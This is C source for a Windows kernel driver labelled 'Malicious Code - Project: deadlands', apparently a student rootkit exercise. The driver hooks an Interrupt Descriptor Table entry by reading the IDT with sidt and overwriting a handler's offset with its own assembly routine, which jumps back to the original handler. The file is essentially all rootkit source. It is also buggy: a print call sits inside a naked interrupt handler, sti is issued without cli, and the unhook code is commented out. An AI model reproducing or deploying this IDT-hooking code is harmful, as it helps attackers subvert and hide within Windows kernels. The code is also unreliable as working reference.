/*
**
** Malicious Code - Project: deadlands
** Filename	: [ deadlands-idt.c ]
** Method	: [ Interrupt Descriptor Table ]
** Epi-Tek4 : [ Armand Morgan, Hochwelker Florent, Toumi Majdi ]
**
*/

#include <ntddk.h>
#include <string.h>
#include <stdlib.h>
#include <WINDEF.H>
#include "deadlands-idt.h"

/*
** INITIALIZATIONS:
*/
DWORD	OldInterruptServiceRoutine;

/*
** DRIVERS:
*/
NTSTATUS	DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	DWORD			i;
	NTSTATUS		status;
	PDEVICE_OBJECT	pDeviceObject;
	UNICODE_STRING	deviceName;
	UNICODE_STRING	dosDeviceName;

	DbgPrint("[MSG]: deadlands HOOK IDT - driver entry\n");

	pDeviceObject = NULL;
	RtlInitUnicodeString(&deviceName, DEVICE_NAME);
	RtlInitUnicodeString(&dosDeviceName, DOSDEVICE_NAME);
	status = IoCreateDevice(pDriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &pDeviceObject);
	if (status != STATUS_SUCCESS)
	{
		DbgPrint("[ERR]: deadlands DKOM - can't create I/O device!\n");
		return (status);
	}
	  
	pDeviceObject->Flags |= DO_BUFFERED_IO;
	
	pDriverObject->DriverUnload = DriverUnload;
	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
		pDriverObject->MajorFunction[i] = DriverIrpUnsupported;

	pDriverObject->MajorFunction[IRP_MJ_CREATE] = DriverIrpCreate;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverIrpClose;
	pDriverObject->MajorFunction[IRP_MJ_WRITE] = DriverIrpWrite;
	
	IoCreateSymbolicLink(&dosDeviceName, &deviceName);
	HookIDT();

	return (STATUS_SUCCESS);
}

NTSTATUS		DriverUnload(PDRIVER_OBJECT pDriverObject)
{
  UNICODE_STRING	dosDeviceName;

  DbgPrint("[MSG]: deadlands HOOK IDT - driver unload\n");

  RtlInitUnicodeString(&dosDeviceName, DOSDEVICE_NAME);
  IoDeleteSymbolicLink(&dosDeviceName);
  IoDeleteDevice(pDriverObject->DeviceObject);
  return (STATUS_SUCCESS);
}

NTSTATUS	DriverIrpUnsupported(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
  DbgPrint("[MSG]: deadlands HOOK IDT - driver irp unsupported\n");
  return (STATUS_NOT_SUPPORTED);
}

NTSTATUS	DriverIrpCreate(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
  DbgPrint("[MSG]: deadlands HOOK IDT - driver irp create\n");
  return (STATUS_SUCCESS);
}

NTSTATUS	DriverIrpClose(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
  DbgPrint("[MSG]: deadlands HOOK IDT - driver irp close\n");
  return (STATUS_SUCCESS);
}

NTSTATUS	DriverIrpWrite(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
	PIO_STACK_LOCATION	pIoStackIrp;
	NTSTATUS			status;
	PCHAR				pInputBuffer;
	
	DbgPrint("[MSG]: deadlands HOOK IDT - driver irp write\n");
	
	pIoStackIrp = IoGetCurrentIrpStackLocation(pIrp);
	pInputBuffer = (PCHAR)pIrp->AssociatedIrp.SystemBuffer;

	status = STATUS_SUCCESS;
	return (status);
}

/*
** ALGORITHM: HOOK IDT
*/
NAKED void	MyISRHandle()
{
	DbgPrint("[MSG]: deadlands HOOK IDT - interrupt powned!!\n");

	__asm
	{
		pushad
		pushfd
		push fs
		mov bx,0x30
		mov fs,bx
		push ds
		push es

		mov ebx, eax;

		pop es
		pop ds
		pop fs
		popfd
		popad

		jmp	OldInterruptServiceRoutine;
	}
}


void		HookIDT()
{
	IDTINFO		idtInfo;
	IDTENTRY	*idtEntry;
	IDTENTRY	*int0x0;

	__asm
	{
		// cli
		sidt idtInfo
	}
	
	idtEntry = (IDTENTRY *)MAKELONG(idtInfo.LowIDTbase, idtInfo.HiIDTbase);
    DbgPrint("Addr IDT entry : %x\n",idtEntry);
	OldInterruptServiceRoutine = MAKELONG(idtEntry[nINT].LowOffset,idtEntry[nINT].HiOffset);

	int0x0 = &(idtEntry[nINT]);
	
	//idtEntry = (IDTENTRY *)(idtInfo.HiIDTbase << 16 | idtInfo.LowIDTbase);
    //*realHandler = (ULONG)(idtEntry[interruption].HighOffset << 16 | idtEntry[interruption].LowOffset);

	idtEntry[nINT].LowOffset = (USHORT)MyISRHandle;
    idtEntry[nINT].HiOffset = (USHORT)((ULONG)MyISRHandle >> 16);


 /*
 __asm{
		cli;
		lea eax,MyKiSystemService;
		mov ebx, int2e_entry;
		mov [ebx],ax;
		shr eax,16
		mov [ebx+6],ax;

		lidt idtInfo;
		sti;
	}
	*/
        __asm { sti }
}

/*
void		UnHookIDT(ULONG interruption)
{
	PIDTENTRY idtEntry;
    IDTINFO idtInfo;
 
        __asm
        {
            sidt idtInfo
            cli
        }
 
        idtEntry = (IDTENTRY*)(idtInfo.HighIDTbase << 16 | idtInfo.LowIDTbase);
 
        idtEntry[interruption].LowOffset = (USHORT)handlerReel;
        idtEntry[interruption].HighOffset = (USHORT)((ULONG)handlerReel >> 16);
 
        __asm { sti }
}
*/
